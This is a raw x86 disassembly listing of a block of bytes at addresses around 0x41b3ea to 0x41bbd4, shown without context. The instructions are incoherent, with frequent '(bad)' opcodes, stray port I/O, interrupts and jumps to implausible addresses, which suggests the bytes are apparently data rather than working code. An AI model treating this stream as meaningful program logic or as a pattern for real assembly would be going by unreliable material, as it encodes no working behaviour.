  41b3ea:	or     eax,DWORD PTR [ecx]
  41b3ec:	iret   
  41b3ed:	lods   eax,DWORD PTR ds:[esi]
  41b3ee:	fst    st(2)
  41b3f0:	mov    bh,0xce
  41b3f2:	jecxz  0x41b3e8
  41b3f4:	stc    
  41b3f5:	(bad)
  41b3f8:	aad    0xba
  41b3fa:	into   
  41b3fb:	call   0xc721adb7
  41b400:	(bad)  
  41b402:	sar    BYTE PTR [esi+eax*8-0x3614fd07],1
  41b409:	out    0xca,al
  41b40b:	out    0xc7,eax
  41b40d:	ror    bh,cl
  41b40f:	(bad)  
  41b410:	lods   eax,DWORD PTR ds:[esi]
  41b411:	mov    dl,0xe9
  41b413:	fidiv  DWORD PTR [edi-0x2729163c]
  41b419:	sti    
  41b41a:	shr    bh,1
  41b41c:	fscale 
  41b41e:	ret    0xd3e3
  41b421:	or     edi,esp
  41b423:	sar    edx,0xf7
  41b426:	push   es
  41b427:	pop    es
  41b428:	lds    ecx,FWORD PTR [ebx]
  41b42a:	out    0xf,eax
  41b42c:	rol    ch,cl
  41b42e:	out    dx,al
  41b42f:	repnz xlat BYTE PTR ds:[ebx]
  41b431:	aam    0xad
  41b433:	shl    BYTE PTR [eax-0x25251729],1
  41b439:	std    
  41b43a:	mov    esi,0xd5dcf6ee
  41b43f:	(bad)  
  41b440:	push   esi
  41b442:	fnstcw WORD PTR [edi+edi*8-0x111a063a]
  41b449:	fld    QWORD PTR [edi]
  41b44b:	push   cs
  41b44c:	mov    dl,0xf0
  41b44e:	loopne 0x41b432
  41b450:	loop   0x41b417
  41b452:	shl    BYTE PTR [edi-0x214b2829],0xeb
  41b459:	xlat   BYTE PTR ds:[ebx]
  41b45a:	hlt    
  41b45b:	fistp  QWORD PTR [eax-0x1cfe0a26]
  41b461:	aam    0xf4
  41b463:	jecxz  0x41b425
  41b465:	jmp    0x41b46c
  41b467:	enter  0xfbc3,0xe6
  41b46b:	int    0xd9
  41b46d:	(bad)  
  41b46e:	int    0xad
  41b470:	loope  0x41b45b
  41b472:	jmp    0xfdf3:0xecf2d1f9
  41b479:	(bad)  [ecx-0x3c18fd12]
  41b47f:	fnstsw WORD PTR [edi+0xfbb9f3]
  41b485:	add    ch,dl
  41b487:	or     ebp,esp
  41b489:	les    ecx,FWORD PTR [ebx]
  41b48b:	or     ah,dh
  41b48d:	lods   eax,DWORD PTR ds:[esi]
  41b48e:	out    dx,eax
  41b48f:	mul    esi
  41b491:	shl    BYTE PTR [edx-0x2f113e0c],0xee
  41b498:	sti    
  41b499:	fld    QWORD PTR [edx]
  41b49b:	(bad)  
  41b49d:	mov    eax,0xc7ddfd06
  41b4a2:	repnz fdiv st(5),st
  41b4a5:	lock jmp 0x41b47c
  41b4a8:	(bad)  
  41b4aa:	out    0xcf,al
  41b4ac:	int    0xd7
  41b4ae:	loope  0x41b486
  41b4b0:	shl    al,0xc0
  41b4b3:	(bad)  [eax-0xa06182d]
  41b4b9:	iret   
  41b4ba:	leave  
  41b4bb:	repnz add edx,edx
  41b4be:	aad    0xbf
  41b4c0:	mov    edi,0xf6dfc2d4
  41b4c5:	fcmovnu st,st(7)
  41b4c7:	iret   
  41b4c8:	aad    0xe2
  41b4ca:	in     al,0xa
  41b4cc:	retf   0xecd0
  41b4cf:	repnz shl DWORD PTR [ebp-0x2b0e243b],1
  41b4d6:	(bad)  
  41b4d8:	mov    eax,0xf9ff02b9
  41b4dd:	(bad)  
  41b4df:	jecxz  0x41b4a2
  41b4e1:	(bad)  
  41b4e2:	fadd   DWORD PTR [esp+ebx*8]
  41b4e5:	push   es
  41b4e6:	cld    
  41b4e7:	cmc    
  41b4e8:	std    
  41b4e9:	loop   0x41b4d2
  41b4eb:	shr    bl,cl
  41b4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ee:	(bad)
  41b4f1:	mov    dl,0xb6
  41b4f3:	mov    ah,0xd8
  41b4f5:	clc    
  41b4f6:	retf   0xfab4
  41b4f9:	into   
  41b4fa:	mov    eax,0x1d1f003
  41b4ff:	hlt    
  41b500:	not    esp
  41b502:	loope  0x41b4e1
  41b504:	add    eax,0xd8efe5eb
  41b509:	cli    
  41b50a:	add    dh,ch
  41b50c:	(bad)
  41b510:	mov    ebp,0xd0c7cbc0
  41b515:	hlt    
  41b516:	call   0xf63c6916
  41b51b:	ror    ch,1
  41b51d:	fldln2 
  41b51f:	faddp  st(6),st
  41b521:	in     al,0xf6
  41b523:	shl    ebx,1
  41b525:	bswap  edx
  41b527:	fiadd  WORD PTR [ebx]
  41b529:	out    dx,eax
  41b52a:	ror    ebx,cl
  41b52c:	rcl    al,1
  41b52e:	lods   al,BYTE PTR ds:[esi]
  41b52f:	repnz fstp st(3)
  41b532:	(bad)  
  41b533:	mov    ebx,0xeeead7ca
  41b538:	jmp    0x21f881c
  41b53d:	in     al,dx
  41b53e:	shl    bh,1
  41b540:	repz sar bl,cl
  41b543:	(bad)  
  41b544:	in     al,0x0
  41b546:	out    0x6,al
  41b548:	in     eax,0xdc
  41b54a:	out    0xa,al
  41b54c:	fmul   st(0),st
  41b54e:	mov    esi,0xe8f0f2f2
  41b553:	cmc    
  41b554:	in     eax,0xe8
  41b556:	ror    esi,cl
  41b558:	fsubp  st(6),st
  41b55a:	loop   0x41b54d
  41b55c:	mov    edi,0xbce7cdbf
  41b561:	mov    ebp,0xe3cac5f6
  41b566:	sar    bh,0xdc
  41b569:	ret    0xe4fd
  41b56c:	rol    dh,1
  41b56e:	rcl    edx,1
  41b570:	(bad)
  41b573:	rcl    cl,0xfb
  41b576:	mov    cl,0xde
  41b578:	cli    
  41b579:	xlat   BYTE PTR ds:[ebx]
  41b57a:	int    0xcd
  41b57c:	mov    esp,0xc702bfed
  41b581:	repz add dh,dh
  41b584:	icebp  
  41b585:	(bad)  
  41b586:	out    dx,al
  41b587:	jmp    0x41b578
  41b589:	add    eax,esp
  41b58b:	in     al,0xea
  41b58d:	loope  0x41b559
  41b58f:	loop   0x41b544
  41b591:	jmp    0x41b545
  41b593:	retf   0xc0e8
  41b596:	retf   
  41b597:	hlt    
  41b598:	sar    bh,cl
  41b59a:	mov    edx,0xdbf8d501
  41b59f:	xlat   BYTE PTR ds:[ebx]
  41b5a0:	loope  0x41b580
  41b5a2:	repnz sti 
  41b5a4:	retf   0xdebe
  41b5a7:	jmp    0x41b585
  41b5a9:	fxam   
  41b5ab:	or     al,dh
  41b5ad:	leave  
  41b5ae:	jmp    0xf42c9b5f
  41b5b3:	repz iret 
  41b5b5:	stc    
  41b5b6:	fidivr WORD PTR [eax-0x262f2527]
  41b5bc:	sti    
  41b5bd:	add    bl,dl
  41b5bf:	out    dx,al
  41b5c0:	mov    ebx,0xfbb8d4fe
  41b5c5:	lock rol dh,0xfb
  41b5c9:	fldz   
  41b5cb:	stc    
  41b5cc:	iret   
  41b5cd:	rol    dl,cl
  41b5cf:	lods   eax,DWORD PTR ds:[esi]
  41b5d0:	out    0xed,al
  41b5d2:	mov    cl,0xeb
  41b5d4:	loope  0x41b5aa
  41b5d6:	mov    dh,0xe9
  41b5d8:	(bad)  
  41b5d9:	xlat   BYTE PTR ds:[ebx]
  41b5da:	mov    eax,0xd1bdffd7
  41b5df:	int    0xd4
  41b5e1:	(bad)  
  41b5e2:	(bad)  
  41b5e3:	lock ror BYTE PTR [eax],1
  41b5e6:	rcl    dh,0xc
  41b5e9:	leave  
  41b5ea:	loop   0x41b5fa
  41b5ec:	shr    al,cl
  41b5ee:	jmp    0xcc369ec2
  41b5f3:	mov    ah,0xec
  41b5f5:	int3   
  41b5f6:	leave  
  41b5f7:	cmc    
  41b5f8:	iret   
  41b5f9:	mov    dl,0xfb
  41b5fb:	icebp  
  41b5fc:	loope  0x41b5d3
  41b5fe:	xlat   BYTE PTR ds:[ebx]
  41b5ff:	ret    0xecc5
  41b602:	fdivr  st,st(5)
  41b604:	out    0xe3,al
  41b606:	out    dx,eax
  41b607:	push   es
  41b608:	(bad)  
  41b609:	std    
  41b60a:	iret   
  41b60b:	adc    ah,cl
  41b60d:	fdivr  st(6),st
  41b60f:	mov    ebp,0xa8b7dbd3
  41b614:	sar    BYTE PTR [eax-0x2625291c],cl
  41b61a:	shr    edx,1
  41b61c:	add    bh,bl
  41b61e:	aad    0xf2
  41b620:	add    ah,al
  41b622:	add    eax,DWORD PTR [edx]
  41b624:	fcmovnb st,st(4)
  41b626:	retf   
  41b627:	hlt    
  41b628:	sti    
  41b629:	in     al,dx
  41b62a:	jmp    0xd4c3:0xc3edca09
  41b631:	call   0xebf7771c
  41b636:	out    0xb9,al
  41b638:	retf   
  41b639:	stc    
  41b63a:	into   
  41b63b:	(bad)  
  41b63c:	(bad)  
  41b63d:	rol    BYTE PTR [esi],1
  41b63f:	loopne 0x41b645
  41b641:	ret    0x6f6
  41b644:	fmul   st(1),st
  41b646:	add    DWORD PTR [ebx],ecx
  41b648:	push   cs
  41b649:	loope  0x41b632
  41b64b:	int    0xc2
  41b64d:	shl    edi,1
  41b64f:	mov    dh,0xef
  41b651:	rol    al,1
  41b653:	loop   0x41b643
  41b655:	int3   
  41b656:	out    dx,eax
  41b657:	sar    esp,cl
  41b659:	mov    ch,0xfc
  41b65b:	hlt    
  41b65c:	sti    
  41b65d:	in     al,dx
  41b65e:	out    dx,eax
  41b65f:	repz fld st(3)
  41b662:	add    ah,bl
  41b664:	cmc    
  41b665:	sti    
  41b666:	add    BYTE PTR ds:0x908e603,al
  41b66c:	repnz stos BYTE PTR es:[edi],al
  41b66e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b66f:	in     eax,dx
  41b670:	ror    esp,0xbb
  41b673:	mov    ecx,0xf4b8d1b4
  41b679:	jecxz  0x41b651
  41b67b:	aad    0xd3
  41b67d:	add    DWORD PTR [ecx-0xd19231a],edi
  41b683:	in     eax,0xf0
  41b685:	out    0xe8,eax
  41b687:	or     cl,BYTE PTR [ebx+eiz*8]
  41b68a:	or     ecx,DWORD PTR ds:0xf2cdbfb1
  41b690:	leave  
  41b691:	shr    cl,cl
  41b693:	jmp    0x41b65b
  41b695:	mov    edx,0xf6dff7c4
  41b69a:	fnstsw WORD PTR [ebp-0x53c1d42]
  41b6a0:	mov    ebp,0xf10bd7f4
  41b6a5:	clc    
  41b6a6:	pop    es
  41b6a7:	fucomi st,st(2)
  41b6a9:	enter  0xe407,0xf0
  41b6ad:	ffree  st(3)
  41b6af:	fst    st(6)
  41b6b1:	mov    dl,0xb5
  41b6b3:	enter  0xd9e1,0xc8
  41b6b7:	clc    
  41b6b8:	fucom  st(4)
  41b6ba:	sti    
  41b6bb:	fidivr WORD PTR [edx-0x392cfe0c]
  41b6c1:	mov    ebp,0xfcd6f2db
  41b6c6:	in     eax,0xcb
  41b6c8:	clc    
  41b6c9:	sti    
  41b6ca:	(bad)  
  41b6cc:	ret    
  41b6cd:	call   0xb40f9bbb
  41b6d2:	in     eax,0xce
  41b6d4:	fucomi st,st(2)
  41b6d6:	call   0xfc0b7cd0
  41b6db:	mov    ah,0xb8
  41b6dd:	cli    
  41b6de:	add    ch,ch
  41b6e0:	rol    BYTE PTR [edx],1
  41b6e2:	shl    ecx,1
  41b6e4:	sti    
  41b6e5:	retf   0x20b
  41b6e8:	call   0xde3592bc
  41b6ed:	ror    ebx,0xce
  41b6f0:	out    dx,eax
  41b6f1:	int3   
  41b6f2:	out    dx,eax
  41b6f3:	not    bl
  41b6f5:	(bad)  
  41b6f7:	aad    0xea
  41b6f9:	enter  0xbbe2,0xb8
  41b6fd:	out    0xdc,eax
  41b6ff:	int    0xd5
  41b701:	repz or ah,bl
  41b704:	or     ch,bh
  41b706:	iret   
  41b707:	(bad)  
  41b708:	fild   DWORD PTR [eax]
  41b70a:	(bad)  
  41b70b:	icebp  
  41b70c:	test   eax,0xdcd7b7de
  41b711:	rcl    esp,1
  41b713:	out    dx,eax
  41b714:	in     al,0xce
  41b716:	(bad)  
  41b718:	(bad)  
  41b719:	shl    cl,1
  41b71b:	(bad)  
  41b71c:	call   0xd20373f4
  41b721:	stc    
  41b722:	clc    
  41b723:	(bad)  
  41b724:	(bad)  
  41b726:	or     dh,bh
  41b728:	(bad)  
  41b729:	leave  
  41b72a:	add    ebp,esp
  41b72c:	int    0xe3
  41b72e:	jmp    0xb0ed:0xd3d6cade
  41b735:	call   0xbd18b10f
  41b73a:	cmc    
  41b73b:	cli    
  41b73c:	lock fsqrt 
  41b73f:	mov    BYTE PTR [ecx],0x4
  41b742:	jmp    esi
  41b744:	mul    dl
  41b746:	fisttp WORD PTR ds:0xe3d8f908
  41b74c:	shr    BYTE PTR [esi-0x4b384931],cl
  41b752:	(bad)  
  41b753:	shl    BYTE PTR [esi+esi*4-0x15013a13],cl
  41b75a:	add    ecx,edi
  41b75c:	cmc    
  41b75d:	cli    
  41b75e:	loopne 0x41b755
  41b760:	repz push es
  41b762:	(bad)  
  41b763:	mov    eax,0xfafec7dd
  41b768:	retf   
  41b769:	jecxz  0x41b765
  41b76b:	jmp    0xf4ab:0xd3e2cccb
  41b772:	xlat   BYTE PTR ds:[ebx]
  41b773:	out    0xb4,eax
  41b775:	hlt    
  41b776:	xlat   BYTE PTR ds:[ebx]
  41b777:	mov    dh,0xfa
  41b779:	mov    edx,0xddf4dfd0
  41b77e:	shl    edi,1
  41b780:	in     al,dx
  41b781:	(bad)  
  41b783:	(bad)  
  41b785:	out    dx,eax
  41b786:	leave  
  41b787:	loope  0x41b789
  41b789:	add    eax,0xeddfe413
  41b78e:	mov    bl,0xac
  41b790:	out    0xd1,al
  41b792:	rcl    edx,0xf8
  41b795:	fcom   st(4)
  41b797:	mov    ecx,0xd5d5d1b6
  41b79c:	loop   0x41b78e
  41b79e:	add    dh,dh
  41b7a0:	loopne 0x41b764
  41b7a2:	ror    bl,1
  41b7a4:	out    0xb,eax
  41b7a6:	jmp    0x131d98b4
  41b7ab:	enter  0xe0ea,0xc6
  41b7af:	shl    DWORD PTR [esi-0x2a4d380a],1
  41b7b5:	repz in al,dx
  41b7b7:	(bad)  
  41b7b8:	jmp    0xd7d2:0xd1ceb1fa
  41b7bf:	add    eax,0xe9c3dce5
  41b7c4:	add    al,0x8
  41b7c6:	out    dx,eax
  41b7c7:	hlt    
  41b7c8:	(bad)  
  41b7c9:	jmp    0xcaf7:0xb2df03e4
  41b7d0:	leave  
  41b7d1:	mov    ch,0xb7
  41b7d3:	hlt    
  41b7d4:	fdiv   DWORD PTR [esi+ebx*8-0x4e140a22]
  41b7db:	jmp    0xe33b8ebb
  41b7e0:	add    dh,ch
  41b7e2:	rol    ebx,1
  41b7e4:	pop    es
  41b7e5:	loopne 0x41b7b1
  41b7e7:	loop   0x41b7f8
  41b7e9:	in     eax,dx
  41b7ea:	push   cs
  41b7eb:	or     al,0xe1
  41b7ed:	(bad)  
  41b7ee:	icebp  
  41b7ef:	out    dx,eax
  41b7f0:	out    dx,al
  41b7f1:	mov    bh,0xcd
  41b7f3:	retf   0xdbba
  41b7f6:	(bad)  
  41b7f7:	rcl    edx,1
  41b7f9:	sar    esp,1
  41b7fb:	mov    ecx,0xd5d1e1e2
  41b800:	(bad)  
  41b801:	(bad)  
  41b802:	cli    
  41b803:	add    eax,DWORD PTR ds:0xfcebdbbe
  41b809:	add    dh,ch
  41b80b:	retf   0xbead
  41b80e:	in     al,dx
  41b80f:	mov    esi,0xd6d6aab3
  41b814:	jmp    0x41b7e3
  41b816:	mov    dh,0xbf
  41b818:	(bad)  
  41b819:	(bad)  
  41b81a:	sti    
  41b81b:	out    dx,eax
  41b81c:	(bad)  
  41b81e:	into   
  41b81f:	aam    0xbe
  41b821:	mov    edx,0xd0d6c4e2
  41b826:	fisttp WORD PTR [esi]
  41b828:	jmp    0xa5d8:0xdf05e709
  41b82f:	repnz mov dh,0xd2
  41b832:	mov    al,0xcb
  41b834:	repz rcl bh,0xda
  41b838:	mov    ah,0xf4
  41b83a:	mov    eax,0xd3c2c3f5
  41b83f:	int    0xff
  41b841:	pop    es
  41b842:	(bad)  
  41b844:	lds    eax,FWORD PTR ds:0xbfff606
  41b84a:	in     al,dx
  41b84b:	jmp    0xecc2:0xeae6dff0
  41b852:	iret   
  41b853:	ror    edi,cl
  41b855:	repnz stc 
  41b857:	out    dx,al
  41b858:	in     al,dx
  41b859:	test   edi,0xd0f6fecf
  41b85f:	clc    
  41b860:	mov    ebx,0xac3cbdd
  41b865:	lock cmc 
  41b867:	(bad)  
  41b868:	jmp    0x41b835
  41b86a:	pmaxsw mm4,mm5
  41b86d:	mov    bl,0xbe
  41b86f:	retf   
  41b870:	lods   al,BYTE PTR ds:[esi]
  41b871:	rol    edi,1
  41b873:	aam    0xf1
  41b875:	call   0xd71a8971
  41b87a:	into   
  41b87b:	ret    
  41b87c:	repnz aam 0xb9
  41b87f:	aad    0xe2
  41b881:	loop   0x41b883
  41b883:	shl    ebx,0xd6
  41b886:	hlt    
  41b887:	aam    0xef
  41b889:	retf   0x313
  41b88c:	enter  0xded3,0xac
  41b890:	loope  0x41b88d
  41b892:	mul    dl
  41b894:	in     al,0xed
  41b896:	mov    dh,0xf6
  41b898:	div    bl
  41b89a:	fidivr WORD PTR [edx-0x210cff31]
  41b8a0:	mov    esp,0x8ead6e2
  41b8a5:	xlat   BYTE PTR ds:[ebx]
  41b8a6:	(bad)  
  41b8a7:	(bad)  
  41b8a8:	mov    BYTE PTR [ecx],0xc9
  41b8ab:	add    al,0xbf
  41b8ad:	lock div DWORD PTR [eax-0x1a323f0d]
  41b8b4:	(bad)  
  41b8b6:	hlt    
  41b8b7:	aad    0xdb
  41b8b9:	idiv   bh
  41b8bb:	clc    
  41b8bc:	mov    esi,0xbcc2c2e2
  41b8c1:	add    eax,ebx
  41b8c3:	icebp  
  41b8c4:	push   es
  41b8c5:	(bad)  
  41b8c7:	cmc    
  41b8c8:	std    
  41b8c9:	ftst   
  41b8cb:	cli    
  41b8cc:	stos   DWORD PTR es:[edi],eax
  41b8cd:	in     eax,0xc4
  41b8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8d0:	mov    dh,0xc8
  41b8d2:	(bad)  
  41b8d3:	stc    
  41b8d4:	icebp  
  41b8d5:	neg    bh
  41b8d7:	repnz mov bh,0xd8
  41b8da:	out    dx,al
  41b8db:	(bad)  
  41b8dc:	mov    esi,0xece5f0f5
  41b8e1:	jmp    0x41b8a6
  41b8e3:	mul    ah
  41b8e5:	fcmovnu st,st(3)
  41b8e7:	add    al,0x3
  41b8e9:	or     ch,ah
  41b8eb:	fidivr WORD PTR [esi-0x163d3a4f]
  41b8f1:	(bad)  [ecx+edi*8-0x400d313c]
  41b8f8:	fsubr  st,st(2)
  41b8fa:	cli    
  41b8fb:	(bad)  
  41b8fc:	mov    eax,0xf7fe07f4
  41b901:	xlat   BYTE PTR ds:[ebx]
  41b902:	sti    
  41b903:	xlat   BYTE PTR ds:[ebx]
  41b904:	shl    edi,1
  41b906:	leave  
  41b907:	loope  0x41b915
  41b909:	stc    
  41b90a:	repz adc ch,al
  41b90d:	into   
  41b90e:	iret   
  41b90f:	mov    cl,0xf2
  41b911:	sti    
  41b912:	jmp    0xeaf1:0xdef1d6b7
  41b919:	int3   
  41b91a:	std    
  41b91b:	fcmovnu st,st(5)
  41b91d:	icebp  
  41b91e:	into   
  41b91f:	out    0xbe,eax
  41b921:	sar    ch,cl
  41b923:	loopne 0x41b90f
  41b925:	out    0xfb,al
  41b927:	or     bh,ah
  41b929:	ud2    
  41b92b:	shr    ch,0xb8
  41b92e:	scas   eax,DWORD PTR es:[edi]
  41b92f:	loop   0x41b8f6
  41b931:	fucomi st,st(3)
  41b933:	repnz sti 
  41b935:	in     al,0xb1
  41b937:	aad    0xf9
  41b939:	iret   
  41b93a:	sar    eax,1
  41b93c:	in     al,dx
  41b93d:	mov    eax,0xe5c3fdd4
  41b942:	loopne 0x41b93c
  41b944:	shr    edx,0xe
  41b947:	loop   0x41b957
  41b949:	fsubr  st,st(3)
  41b94b:	psraw  mm3,mm6
  41b94e:	out    0xed,eax
  41b950:	iret   
  41b951:	loopne 0x41b929
  41b953:	loop   0x41b93f
  41b955:	out    0xe4,al
  41b957:	(bad)  
  41b958:	fdivr  st,st(7)
  41b95a:	sar    DWORD PTR [ecx-0xc1f4906],1
  41b960:	(bad)  
  41b961:	jmp    0x41b96a
  41b963:	cld    
  41b964:	add    eax,0xb04c8d9
  41b969:	loop   0x41b93e
  41b96b:	or     bh,BYTE PTR [esi-0x12393854]
  41b971:	shl    cl,cl
  41b973:	mov    ah,0xc6
  41b976:	ror    ebp,1
  41b978:	out    dx,al
  41b979:	lock test DWORD PTR [ebx],0xf3eec0db
  41b980:	mov    edi,0xe002fdbd
  41b985:	aad    0xc8
  41b987:	enter  0x3ce,0xd8
  41b98b:	std    
  41b98c:	in     al,0xea
  41b98e:	loop   0x41b951
  41b990:	loope  0x41b979
  41b992:	call   0xd7fb9267
  41b997:	out    dx,eax
  41b998:	sar    DWORD PTR [edi-0x7103232],1
  41b99e:	loop   0x41b960
  41b9a0:	repz fsubr st(0),st
  41b9a3:	add    eax,edi
  41b9a5:	out    0xe1,al
  41b9a7:	fmul   st,st(1)
  41b9a9:	(bad)  
  41b9aa:	stc    
  41b9ab:	fsubr  QWORD PTR [edx-0x370c1e37]
  41b9b1:	jecxz  0x41b97b
  41b9b3:	repz fcom st(5)
  41b9b6:	mov    ecx,0xfdbcb5d2
  41b9bb:	int    0xe9
  41b9bd:	into   
  41b9be:	out    0x1,eax
  41b9c0:	(bad)
  41b9c3:	fcom   st(6)
  41b9c5:	leave  
  41b9c6:	out    0x5,al
  41b9c8:	retf   0xcb06
  41b9cb:	add    edi,DWORD PTR [eax+eiz*8-0xb315b1c]
  41b9d2:	loop   0x41b9a9
  41b9d4:	shl    BYTE PTR [eax-0x27043530],0xcd
  41b9db:	aam    0xd4
  41b9dd:	std    
  41b9de:	(bad)  
  41b9df:	idiv   edx
  41b9e1:	(bad)  
  41b9e2:	ftst   
  41b9e4:	loop   0x41b9dc
  41b9e6:	loope  0x41b9ae
  41b9e8:	jmp    0x41b9de
  41b9ea:	in     al,0xe6
  41b9ec:	mov    esp,0xf7e8d3d2
  41b9f1:	lock loopne 0x41b9a8
  41b9f4:	in     al,0xc4
  41b9f6:	mov    eax,0xd9ffcdc9
  41b9fb:	mov    ecx,0xdff1c8bf
  41ba00:	mov    esi,0xffebd905
  41ba05:	psrad  mm1,QWORD PTR ds:0xcf0f04e3
  41ba0c:	into   
  41ba0d:	stos   BYTE PTR es:[edi],al
  41ba0e:	ret    0xc8f5
  41ba11:	out    dx,al
  41ba12:	jecxz  0x41b9ed
  41ba14:	retf   
  41ba15:	int3   
  41ba16:	iret   
  41ba17:	icebp  
  41ba18:	mov    ebx,0xd9b0bcde
  41ba1d:	(bad)  
  41ba1e:	sar    DWORD PTR [esi-0x2e2a39fa],cl
  41ba24:	cld    
  41ba25:	hlt    
  41ba26:	out    dx,al
  41ba27:	or     bl,bh
  41ba29:	out    dx,eax
  41ba2a:	adc    ch,al
  41ba2c:	retf   
  41ba2d:	mov    dl,0xf0
  41ba2f:	xlat   BYTE PTR ds:[ebx]
  41ba30:	lods   al,BYTE PTR ds:[esi]
  41ba31:	in     eax,0xcc
  41ba33:	aam    0xc5
  41ba35:	int    0xbf
  41ba37:	in     al,0xdf
  41ba39:	cli    
  41ba3a:	ror    dh,1
  41ba3c:	in     eax,dx
  41ba3d:	enter  0xf8bd,0xf4
  41ba41:	cmc    
  41ba42:	push   es
  41ba43:	retf   
  41ba44:	in     al,0xd5
  41ba46:	pop    es
  41ba47:	in     eax,dx
  41ba48:	add    eax,0xe9d9c104
  41ba4d:	retf   0xe9f2
  41ba50:	shl    dl,0xb1
  41ba53:	in     al,dx
  41ba54:	idiv   DWORD PTR [ecx-0x2403471c]
  41ba5a:	out    dx,eax
  41ba5b:	(bad)  
  41ba5c:	mov    esi,0xecced9dc
  41ba61:	(bad)  
  41ba63:	jecxz  0x41ba35
  41ba65:	fsubrp st(2),st
  41ba67:	in     eax,0xc
  41ba69:	leave  
  41ba6a:	rcl    ebx,0xcd
  41ba6d:	out    0xc3,al
  41ba6f:	lods   al,BYTE PTR ds:[esi]
  41ba70:	repnz int3 
  41ba72:	in     eax,0xe6
  41ba74:	int3   
  41ba75:	jmp    0x41ba2f
  41ba77:	out    dx,al
  41ba78:	fxch   st(5)
  41ba7a:	std    
  41ba7b:	loope  0x41ba36
  41ba7d:	lock mov eax,0xf1e2f2f0
  41ba83:	(bad)  
  41ba84:	jecxz  0x41ba7d
  41ba86:	add    ch,ah
  41ba88:	dec    BYTE PTR [eax]
  41ba8a:	cli    
  41ba8b:	adc    esp,ebp
  41ba8d:	loope  0x41ba57
  41ba8f:	(bad)  
  41ba90:	stos   DWORD PTR es:[edi],eax
  41ba91:	jmp    0xc1229f91
  41ba96:	cmc    
  41ba97:	cli    
  41ba98:	jmp    0xdfc0:0xfde3d8ea
  41ba9f:	out    dx,al
  41baa0:	(bad)  
  41baa1:	add    eax,0xe8dbe0e1
  41baa6:	in     al,0xeb
  41baa8:	fcmove st,st(3)
  41baaa:	(bad)  
  41baac:	mov    ecx,0xd0e0e2cb
  41bab1:	xlat   BYTE PTR ds:[ebx]
  41bab2:	mov    cl,0xba
  41bab4:	scas   eax,DWORD PTR es:[edi]
  41bab5:	call   eax
  41bab7:	out    0xca,al
  41bab9:	aam    0xbf
  41babb:	int    0xdd
  41babd:	fmulp  st(6),st
  41babf:	mov    ebp,0xdef7c7e7
  41bac4:	sti    
  41bac5:	add    eax,0xd405d5ff
  41baca:	in     al,dx
  41bacb:	fcomip st,st(1)
  41bacd:	frstor [ebp-0x40e0c53]
  41bad3:	lock cmc 
  41bad5:	fucomip st,st(7)
  41bad7:	int3   
  41bad8:	(bad)  
  41bad9:	mov    ecx,0xb8bee1fc
  41bade:	out    dx,al
  41badf:	test   ecx,0xf9f5e205
  41bae5:	or     eax,DWORD PTR [edx+eiz*8]
  41bae8:	fmul   QWORD PTR [ecx]
  41baea:	repz cli 
  41baec:	mov    cl,0xd8
  41baee:	lock mov bl,0xb5
  41baf1:	lods   eax,DWORD PTR ds:[esi]
  41baf2:	cmc    
  41baf3:	out    dx,eax
  41baf4:	(bad)  
  41baf5:	aam    0xe7
  41baf7:	mov    al,0xbd
  41baf9:	mov    dh,0xd1
  41bafb:	(bad)  [edi-0x3c380007]
  41bb01:	fadd   DWORD PTR [ecx+esi*8]
  41bb04:	add    BYTE PTR [edi],cl
  41bb06:	cmc    
  41bb07:	jmp    0xcebd:0xe8cc0ccb
  41bb0e:	lock shl esi,1
  41bb11:	loopne 0x41bb0d
  41bb13:	(bad)
  41bb16:	sar    BYTE PTR [ebx-0x432b3703],cl
  41bb1c:	mov    bh,0xdc
  41bb1e:	iret   
  41bb1f:	(bad)  
  41bb20:	std    
  41bb21:	dec    DWORD PTR [ebx]
  41bb23:	or     esp,edi
  41bb25:	jmp    0xec499b27
  41bb2a:	or     ebp,ebx
  41bb2c:	int3   
  41bb2d:	fsubr  st,st(2)
  41bb2f:	mov    cl,0xb2
  41bb31:	mov    dh,0xc0
  41bb33:	xlat   BYTE PTR ds:[ebx]
  41bb34:	cli    
  41bb35:	mov    bh,0xcf
  41bb37:	into   
  41bb38:	mov    ecx,0xd5bdefcc
  41bb3d:	aam    0xd8
  41bb3f:	rcl    ecx,1
  41bb41:	cmc    
  41bb42:	in     al,0xc2
  41bb44:	loopne 0x41bb22
  41bb46:	shl    esp,0xdf
  41bb49:	hlt    
  41bb4a:	jmp    0xf7b0:0xe5a9ed12
  41bb51:	out    0xb2,al
  41bb53:	stc    
  41bb54:	loopne 0x41bb43
  41bb56:	lods   eax,DWORD PTR ds:[esi]
  41bb57:	(bad)  
  41bb59:	in     al,0xf0
  41bb5b:	ret    
  41bb5c:	fsubr  st,st(5)
  41bb5e:	pop    es
  41bb5f:	into   
  41bb60:	hlt    
  41bb61:	(bad)  
  41bb62:	(bad)  
  41bb64:	inc    DWORD PTR [eax]
  41bb66:	in     eax,0xee
  41bb68:	dec    DWORD PTR ds:0xd7e5ca08
  41bb6e:	mov    ebp,0xcbf6abd1
  41bb73:	lods   al,BYTE PTR ds:[esi]
  41bb74:	out    0xae,eax
  41bb76:	repnz mov ah,0xf3
  41bb79:	stc    
  41bb7a:	cmc    
  41bb7b:	not    ah
  41bb7d:	(bad)  
  41bb7f:	xlat   BYTE PTR ds:[ebx]
  41bb80:	aam    0xff
  41bb82:	fcomp  st(3)
  41bb84:	icebp  
  41bb85:	stc    
  41bb86:	add    al,0xdc
  41bb88:	stc    
  41bb89:	out    dx,al
  41bb8a:	adc    ecx,edx
  41bb8c:	enter  0xf7ea,0xe8
  41bb90:	ret    
  41bb91:	mov    cl,0xef
  41bb93:	icebp  
  41bb94:	lock test bh,0xb0
  41bb98:	in     al,0xca
  41bb9a:	jmp    0xf502:0xf8f4e001
  41bba1:	cli    
  41bba2:	mov    esp,0xe307c4f4
  41bba7:	cli    
  41bba8:	out    dx,al
  41bba9:	int    0x0
  41bbab:	retf   
  41bbac:	fcomip st,st(0)
  41bbae:	lds    esi,FWORD PTR [ebx-0xe4f1455]
  41bbb4:	out    0xcf,eax
  41bbb6:	mov    cl,0xdd
  41bbb8:	mov    eax,0xf4e8d4e8
  41bbbd:	shl    dh,1
  41bbbf:	ret    
  41bbc0:	(bad)  
  41bbc2:	ret    
  41bbc3:	add    dh,ah
  41bbc5:	add    esi,edx
  41bbc7:	push   cs
  41bbc8:	add    ebx,edi
  41bbca:	call   0xcdec9fc0
  41bbcf:	fsub   st(1),st
  41bbd1:	fadd   st(2),st
  41bbd3:	leave  
  41bbd4:	mov    ch,0xcf
